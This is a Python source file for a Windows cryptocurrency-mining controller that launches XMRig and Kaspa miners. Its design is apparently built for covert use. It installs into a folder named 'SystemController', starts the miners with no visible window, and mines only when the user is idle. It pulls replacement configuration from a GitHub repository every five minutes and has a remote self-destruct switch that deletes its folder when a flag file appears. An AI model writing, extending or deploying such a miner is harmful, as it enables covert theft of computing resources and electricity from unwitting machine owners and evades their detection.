import os
import shutil
import subprocess
import time
import psutil
import ctypes
import json
from datetime import datetime
from typing import Dict, Optional
import socket
import hashlib
import requests

# ==== Wallet ====
def load_wallet():
    wallet_file = os.path.join(BASE_DIR, "wallet.txt")
    try:
        with open(wallet_file, "r", encoding="utf-8") as f:
            return f.read().strip()
    except Exception as e:
        log(f"[ERROR] Could not read wallet.txt: {e}")
        return None

# === where your PS script installs the files ===
_localapp = os.getenv("LOCALAPPDATA") or os.path.expanduser("~")
SAFE_DIR = os.path.join(_localapp, "SystemController")

# === GitHub raw URLs ===
GITHUB_CONFIG_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/config_high.json"
GITHUB_DELETE_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/delete.txt"

# === check GitHub every 5 minutes ===
GITHUB_UPDATE_INTERVAL = 300
_last_update = 0

def sha256_file(path):
    """Return SHA256 hash of a file, or None if missing."""
    try:
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return None


def pull_github_updates():
    """
    Downloads config_high.json if it changed.
    If delete.txt exists in the GitHub repo, deletes the whole SAFE_DIR.
    Returns True if config_high.json changed.
    """
    global _last_update
    now = time.time()

    # Run only once per interval
    if now - _last_update < GITHUB_UPDATE_INTERVAL:
        return False
    _last_update = now

    log("[UPDATE] Checking GitHub for config + delete flag...")

    config_path = MINERS["xmrig"]["cfg_high"]
    changed = False

    # ------------------------------------------------------------
    # 1. CHECK FOR REMOTE DELETE COMMAND
    # ------------------------------------------------------------
    try:
        d = requests.get(GITHUB_DELETE_URL, timeout=10)
        if d.status_code == 200:
            log("[SELF-DESTRUCT] Remote delete.txt found → deleting entire folder NOW")
            try:
                shutil.rmtree(SAFE_DIR)
                log(f"[SELF-DESTRUCT] Deleted {SAFE_DIR}")
            except Exception as e:
                log(f"[SELF-DESTRUCT ERROR] {e}")
            os._exit(0)  # hard exit
    except Exception as e:
        log(f"[DELETE CHECK ERROR] {e}")

    # ------------------------------------------------------------
    # 2. DOWNLOAD UPDATED CONFIG IF CHANGED
    # ------------------------------------------------------------
    try:
        old_hash = sha256_file(config_path)

        r = requests.get(GITHUB_CONFIG_URL, timeout=10)
        if r.status_code == 200:
            new_bytes = r.content
            new_hash = hashlib.sha256(new_bytes).hexdigest()

            if old_hash != new_hash:
                with open(config_path, "wb") as f:
                    f.write(new_bytes)
                changed = True
                log("[UPDATE] config_high.json updated from GitHub")
                print("[UPDATE] config_high.json updated from GitHub")
            else:
                log("[UPDATE] config_high.json is already up-to-date")
                print("[UPDATE] config_high.json is already up-to-date")
        else:
            log(f"[ERROR] GitHub returned HTTP {r.status_code} for config_high.json")
            print(f"[ERROR] GitHub returned HTTP {r.status_code} for config_high.json")

    except Exception as e:
        log(f"[ERROR] Failed downloading config_high.json: {e}")
        print(f"[ERROR] Failed downloading config_high.json: {e}")
    return changed

HOSTNAME = socket.gethostname()

# === ABSOLUTE BASE DIRECTORY ===
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# === SETTINGS ===
IDLE_THRESHOLD = 2   # seconds before idle mode
LOG_FILE = os.path.join(BASE_DIR, "controller.log")

# === BEHAVIOR MODES ===
STOP_KASPA_WHEN_ACTIVE = False     # Set False to keep Kaspa always
STOP_XMRIG_WHEN_ACTIVE = True      # Set False to keep XMRig always


# === MINER DEFINITIONS WITH ABSOLUTE PATHS ===
MINERS = {
    "xmrig": {
        "exe": os.path.join(BASE_DIR, "xmrig.exe"),
        "cfg_high": os.path.join(BASE_DIR, "config_high.json"),
        "log": os.path.join(BASE_DIR, "miner_xmrig.log")
    },
    "kaspa": {
        "exe": os.path.join(BASE_DIR, "kaspa.exe"),
        "cfg_high": os.path.join(BASE_DIR, "kaspa_high.json"),
        "log": os.path.join(BASE_DIR, "miner_kaspa.log")
    }
}

# === HELPERS ===
def get_idle_seconds():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(lii)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return millis / 1000.0


def log(msg):
    stamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(stamp + msg + "\n")
    except:
        pass


def start_miner(exe, cfg, log_file):
    CREATE_NO_WINDOW = 0x08000000
    hostname = os.environ.get("COMPUTERNAME", "unknown-host")
    
    log("------------------------------------------------------------")
    log(f"[DEBUG] start_miner() called")
    log(f"[DEBUG] exe      = {exe}")
    log(f"[DEBUG] cfg file = {cfg}")
    log(f"[DEBUG] log file = {log_file}")
    log(f"[DEBUG] hostname = {hostname}")
    log("------------------------------------------------------------")

    # Load JSON config
    try:
        with open(cfg, "r", encoding="utf-8") as f:
            conf = json.load(f)
        log(f"[DEBUG] Loaded config JSON successfully: {conf}")
    except Exception as e:
        log(f"[ERROR] Failed to load config {cfg}: {e}")
        return None

    # ============================================================
    # KASPA
    # ============================================================
    if "kaspa" in exe.lower():
        raw_cmd = conf["cmdline"].strip()
        log(f"[DEBUG] RAW cmdline from JSON = {raw_cmd}")

        # detect worker substring (desktop-high, worker1, etc.)
        old_worker = None
        if "--user" in raw_cmd:
            for part in raw_cmd.split():
                if part.startswith("kaspa:") and "." in part:
                    old_worker = part.split(".")[1]
                    break

        if old_worker:
            log(f"[DEBUG] Detected worker from JSON = {old_worker}")
        else:
            log("[DEBUG] No worker detected in JSON")

        # Replace worker name ONLY in kaspa_high.json
        """
        if "kaspa_high.json" in cfg.lower():
            new_worker = f"{hostname}-high"
            log(f"[DEBUG] Replacing worker: '{old_worker}' → '{new_worker}'")

            # Replace after the dot: kaspa:xxxxxx.<worker>
            # We only replace the worker part, not the whole user string.
            parts = raw_cmd.split()
            updated_parts = []

            for p in parts:
                if p.startswith("kaspa:") and "." in p:
                    wallet, _ = p.split(".", 1)
                    updated_parts.append(f"{wallet}.{new_worker}")
                else:
                    updated_parts.append(p)

            raw_cmd = " ".join(updated_parts)
        """
        log(f"[DEBUG] FINAL Kaspa cmdline = {raw_cmd}")

        # Build final command list
        cmd = raw_cmd.split()
        cmd.insert(0, exe)

        log(f"[DEBUG] FINAL Kaspa process launch = {cmd}")

    # ============================================================
    # XMRIG
    # ============================================================
    else:
    # --- Inject wallet into config ---
        wallet = load_wallet()
        if not wallet:
            log("[ERROR] No wallet found, XMRIG cannot start.")
            return None

        # Load config JSON
        try:
            with open(cfg, "r", encoding="utf-8") as f:
                conf = json.load(f)
        except Exception as e:
            log(f"[ERROR] Failed to load {cfg}: {e}")
            return None

        # Replace placeholder
        try:
            conf["pools"][0]["user"] = conf["pools"][0]["user"].replace("__WALLET__", wallet)
        except Exception as e:
            log(f"[ERROR] Failed to inject wallet: {e}")
            return None

        # Save temporary injected config
        injected_cfg = os.path.join(BASE_DIR, "config_injected.json")
        try:
            with open(injected_cfg, "w", encoding="utf-8") as f:
                json.dump(conf, f, indent=2)
        except Exception as e:
            log(f"[ERROR] Failed writing injected config: {e}")
            return None

        # Run XMRig using injected config
        cmd = [exe, "-c", injected_cfg]
        log(f"[DEBUG] FINAL XMRIG process launch = {cmd}")

    # ============================================================
    # Launch
    # ============================================================
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=open(log_file, "a", encoding="utf-8"),
            stderr=subprocess.STDOUT,
            creationflags=CREATE_NO_WINDOW,
            cwd=BASE_DIR
        )
        log("[DEBUG] Process started successfully.")
        log(f"[DEBUG] PID = {proc.pid}")
        return proc

    except Exception as e:
        log(f"[ERROR] Failed to start {exe}: {e}")
        return None

def stop_proc(proc):
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except:
            pass

def read_hashrate(log_file):
    try:
        with open(log_file, "rb") as f:
            f.seek(-2048, os.SEEK_END)
            for line in f.readlines()[::-1]:
                if b"speed 10s" in line or b"MH/s" in line:
                    return line.decode(errors="ignore").strip()
    except:
        pass
    return "OFF"

def main():
    procs: Dict[str, Optional[subprocess.Popen]] = {"kaspa": None, "xmrig": None}
    modes = {"kaspa": "off", "xmrig": "off"}

    log("Controller started (idle-only with optional always-on modes).")

    # Check GitHub
    if pull_github_updates():
        log("[RESTART] Config updated → restarting XMRIG")

        stop_proc(procs["xmrig"])
        procs["xmrig"] = start_miner(
            MINERS["xmrig"]["exe"],
            MINERS["xmrig"]["cfg_high"],
            MINERS["xmrig"]["log"]
        )

    while True:
        idle = get_idle_seconds()
        cpu_load = psutil.cpu_percent(interval=1)
        idle_state = idle > IDLE_THRESHOLD

        # ================================
        # START MINERS WHEN IDLE
        # ================================
        if idle_state:

            # XMRIG IDLE-ONLY
            if modes["xmrig"] == "off":
                procs["xmrig"] = start_miner(
                    MINERS["xmrig"]["exe"],
                    MINERS["xmrig"]["cfg_high"],
                    MINERS["xmrig"]["log"]
                )
                modes["xmrig"] = "on"
                log("[XMRIG] Started (IDLE mode HIGH)")

            # KASPA IDLE-ONLY unless always-on is enabled
            #if modes["kaspa"] == "off":
            if False and modes["kaspa"] == "off":
                procs["kaspa"] = start_miner(
                    MINERS["kaspa"]["exe"],
                    MINERS["kaspa"]["cfg_high"],
                    MINERS["kaspa"]["log"]
                )
                modes["kaspa"] = "on"
                log("[KASPA] Started (IDLE mode HIGH)")

        # ================================
        # STOP MINERS WHEN ACTIVE (optional)
        # ================================
        else:

            # XMRIG stops unless user wants it always-on
            if STOP_XMRIG_WHEN_ACTIVE and modes["xmrig"] == "on":
                stop_proc(procs["xmrig"])
                procs["xmrig"] = None
                modes["xmrig"] = "off"
                log("[XMRIG] Stopped (ACTIVE USE)")

            # KASPA stops unless user wants it always-on
            if STOP_KASPA_WHEN_ACTIVE and modes["kaspa"] == "on":
                stop_proc(procs["kaspa"])
                procs["kaspa"] = None
                modes["kaspa"] = "off"
                log("[KASPA] Stopped (ACTIVE USE)")

        # ================================
        # AUTORESTART ON CRASH
        # ================================
        for miner in ["kaspa", "xmrig"]:
            proc = procs.get(miner)
            if proc is not None and proc.poll() is not None:
                log(f"[{miner.upper()}] crashed → restarting")
                procs[miner] = start_miner(
                    MINERS[miner]["exe"],
                    MINERS[miner]["cfg_high"],
                    MINERS[miner]["log"]
                )

        # ================================
        # LOG STATUS
        # ================================
        xmrig_hash = read_hashrate(MINERS["xmrig"]["log"]) if modes["xmrig"] == "on" else "OFF"
        kaspa_hash = read_hashrate(MINERS["kaspa"]["log"]) if modes["kaspa"] == "on" else "OFF"

        log(
            f"CPU={cpu_load}%  IDLE={int(idle)}s  "
            f"KASPA={kaspa_hash}  XMRIG={xmrig_hash}"
        )

        time.sleep(30)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Controller stopped by user.")
